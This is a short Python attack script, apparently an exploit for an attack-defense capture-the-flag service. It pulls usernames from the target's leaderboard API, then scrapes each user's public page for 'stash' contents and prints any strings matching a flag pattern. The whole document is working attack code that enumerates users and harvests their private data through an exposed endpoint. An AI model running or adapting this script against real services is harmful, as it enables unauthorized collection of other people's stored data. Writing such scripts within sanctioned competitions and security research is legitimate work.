import sys
import requests
import re
from bs4 import BeautifulSoup

def attack(ip, port):
    base_url = f"http://{ip}:{port}"
    
    FLAG_PATTERN = r'[A-Z0-9]{31}='

    print(f"[*] Attacking {base_url}...", file=sys.stderr)
    
    try:
        r = requests.get(f"{base_url}/api/leaderboard", timeout=2)
        if r.status_code != 200:
            print("[-] Leaderboard error", file=sys.stderr)
            return
        users = [u['username'] for u in r.json().get('rows', [])]
    except Exception as e:
        print(f"[-] Connection error: {e}", file=sys.stderr)
        return

    print(f"[*] Found {len(users)} users. Scanning stashes...", file=sys.stderr)

    for user in users:
        try:
            url = f"{base_url}/public/{user}"
            r = requests.get(url, timeout=1)
            
            if r.status_code != 200:
                continue

            soup = BeautifulSoup(r.text, 'html.parser')
            stashes = soup.find_all(class_='stash-c') 
            
            for stash in stashes:
                content = stash.get_text(strip=True)
                
                found_flags = re.findall(FLAG_PATTERN, content)
                
                for flag in found_flags:
                    print(flag, flush=True)

        except Exception:
            continue

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python sploit.py <IP> <PORT>")
        sys.exit(1)
        
    ip_addr = sys.argv[1]
    port_arg = sys.argv[2]
    
    attack(ip_addr, port_arg)